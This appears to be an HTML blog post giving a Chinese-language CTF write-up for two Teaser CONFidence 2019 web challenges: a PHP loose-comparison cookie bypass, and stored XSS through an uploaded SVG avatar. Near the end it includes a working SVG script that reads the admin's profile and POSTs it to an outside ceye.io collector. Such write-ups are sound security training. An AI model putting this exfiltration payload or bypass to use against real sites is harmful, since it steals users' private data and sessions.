@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="这次Web题只做了前两道，最后一道GO的题目不会就没做了。 My admin panel题目地址：http://gameserver.zajebistyc.tf/ 题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable? 访问该页面，是">
+<meta name="keywords" content="Web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Teaser CONFidence CTF Web writeup">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="这次Web题只做了前两道，最后一道GO的题目不会就没做了。 My admin panel题目地址：http://gameserver.zajebistyc.tf/ 题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable? 访问该页面，是">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png">
+<meta property="og:updated_time" content="2019-03-22T14:44:53.821Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Teaser CONFidence CTF Web writeup">
+<meta name="twitter:description" content="这次Web题只做了前两道，最后一道GO的题目不会就没做了。 My admin panel题目地址：http://gameserver.zajebistyc.tf/ 题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable? 访问该页面，是">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Teaser CONFidence CTF Web writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/22/图片XSS小结/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/17/SpEL注入之javacon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回頂部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&text=Teaser CONFidence CTF Web writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&is_video=false&description=Teaser CONFidence CTF Web writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Teaser CONFidence CTF Web writeup&body=Check out this article: https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&name=Teaser CONFidence CTF Web writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-admin-panel"><span class="toc-number">1.</span> <span class="toc-text">My admin panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-50"><span class="toc-number">2.</span> <span class="toc-text">Web 50</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Teaser CONFidence CTF Web writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-21T11:58:22.000Z" itemprop="datePublished">2019-03-21</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp-Web/">WriteUp:Web</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Web安全/">Web安全</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>这次Web题只做了前两道，最后一道GO的题目不会就没做了。</p>
+<h2 id="My-admin-panel"><a href="#My-admin-panel" class="headerlink" title="My admin panel"></a>My admin panel</h2><p>题目地址：<a href="http://gameserver.zajebistyc.tf/" target="_blank" rel="noopener">http://gameserver.zajebistyc.tf/</a></p>
+<p>题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable?</p>
+<p>访问该页面，是个登录界面，可以下载客户端包：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png" alt=""></p>
+<p>下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。</p>
+<p>尝试随便输入登录，发现无论输入啥都是返回Done界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png" alt=""></p>
+<p>这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。</p>
+<p>那就尝试用工具扫下Web站点下隐藏的页面，果不其然：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png" alt=""></p>
+<p>一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png" alt=""></p>
+<p>下载下来，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure>
+<p>分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。</p>
+<p>注意，<code>if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {</code>这里用的比较符是!=，按照习惯会想到是PHP弱类型。</p>
+<p>随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png" alt=""></p>
+<p>这里返回了一串经过运算处理后的内容：0006464640640064000646464640006400640640646400</p>
+<p>分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cfg_pass=<span class="string">"Hello666"</span>;</span><br><span class="line"><span class="keyword">echo</span> MD5($cfg_pass);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); $i++) &#123;</span><br><span class="line">	<span class="comment">// echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);</span></span><br><span class="line">	<span class="keyword">echo</span> MD5($cfg_pass)[$i];</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> ord(MD5($cfg_pass)[$i]);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;-------------&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png" alt=""></p>
+<p>可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">	print(str(x)+<span class="string">":"</span>+str(x&amp;<span class="number">0xC0</span>))</span><br></pre></td></tr></table></figure>
+<p>运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。</p>
+<p>那么就很明确了，再看看页面返回的值：0006464640640064000646464640006400640640646400。</p>
+<p>前面3位是0，后面接着是字母结合数字的混合体。</p>
+<p>这时就可以祭出弱类型了，我们知道<code>123==&quot;123aivmfsjoo90i1jj90i0i031&quot;</code>是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为<code>Cookie: otadmin={&quot;hash&quot;: 389}</code>：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png" alt=""></p>
+<h2 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h2><p>题目地址：<a href="http://web50.zajebistyc.tf/login?next=%2F" target="_blank" rel="noopener">http://web50.zajebistyc.tf/login?next=%2F</a></p>
+<p>题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin…</p>
+<p>访问页面，是个登录界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png" alt=""></p>
+<p>随便输入用户名和密码，进入了另一个界面：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png" alt=""></p>
+<p>其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png" alt=""></p>
+<p>另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png" alt=""></p>
+<p>回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png" alt=""></p>
+<p>回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。</p>
+<p>后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。</p>
+<p>写段测试代码，注意要设置宽度和高度均为100：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert("Mi1k7ea");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>本地访问没问题：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png" alt=""></p>
+<p>上传到Avatar：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png" alt=""></p>
+<p>确认一下，访问该Avatar所在地址，没有问题，成功弹框：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png" alt=""></p>
+<p>到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png" alt=""></p>
+<p>后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">xhr.onreadystatechange = function() &#123;</span></span><br><span class="line"><span class="undefined">	if (xhr.readyState === 4) &#123;</span></span><br><span class="line"><span class="undefined">		var xhr2 = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">		xhr2.open("POST", "http://XXXX.ceye.io/");</span></span><br><span class="line"><span class="undefined">		xhr2.send(xhr.responseText);</span></span><br><span class="line"><span class="undefined">	&#125;</span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="undefined">xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");</span></span><br><span class="line"><span class="undefined">xhr.withCredentials = true;</span></span><br><span class="line"><span class="undefined">xhr.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：</p>
+<p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png" alt=""></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
+          <li><a href="/tags/">標籤</a></li>
+         
+          <li><a href="/about/">吾</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">舊文</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#My-admin-panel"><span class="toc-number">1.</span> <span class="toc-text">My admin panel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-50"><span class="toc-number">2.</span> <span class="toc-text">Web 50</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&text=Teaser CONFidence CTF Web writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&is_video=false&description=Teaser CONFidence CTF Web writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Teaser CONFidence CTF Web writeup&body=Check out this article: https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&title=Teaser CONFidence CTF Web writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/&name=Teaser CONFidence CTF Web writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="false"></i> 菜單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="false"></i> 目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="false"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="false"></i> 返回頂部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 Mi1k7ea
+  </div>
+  <span id="busuanzi_container_site_pv"> 
+    <i class="fas fa-eye"></i>
+    过客：<span id="busuanzi_value_site_uv"></span>
+  </span>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">門面</a></li>
+         
+          <li><a href="/archives/">歸檔</a></li>
+         
+          <li><a href="/categories/">目錄</a></li>
+         
